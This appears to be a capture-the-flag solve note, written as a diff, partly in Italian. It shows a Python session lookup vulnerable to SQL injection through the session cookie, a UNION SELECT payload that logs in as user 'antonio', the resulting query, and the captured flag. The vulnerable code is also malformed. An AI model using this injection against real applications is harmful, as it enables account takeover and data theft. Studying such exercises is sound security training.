@@ -1,0 +1,28 @@
+def get_user_from_session(self, session_id):
+        cursor = self.get_cursor()
+
+        cursor.execute(
+            """SELECT users.id, users.username
+            FROM users
+            JOIN sessions ON users.id = sessions.user_id
+            WHERE sessions.id = ''';""" % (session_id,))
+
+        users = cursor.fetchall()
+        cursor.close()
+
+        if len(users) == 1:
+            return users[0]
+
+        return None
+prende le cose direttamente dal cookie quindi l'inj da cookie si fa 
+mi servono le cose di antonio quindi 
+
+' UNION SELECT users.id, users.username from users WHERE users.username = 'antonio
+
+
+SELECT users.id, users.username
+            FROM users
+            JOIN sessions ON users.id = sessions.user_id
+            WHERE sessions.id = '' UNION SELECT users.id, users.username from users WHERE users.username = 'antonio';""" % (session_id,))
+
+flag{t0d0_l3arn_pr3par3d_st4t3m3nts_c8574680}
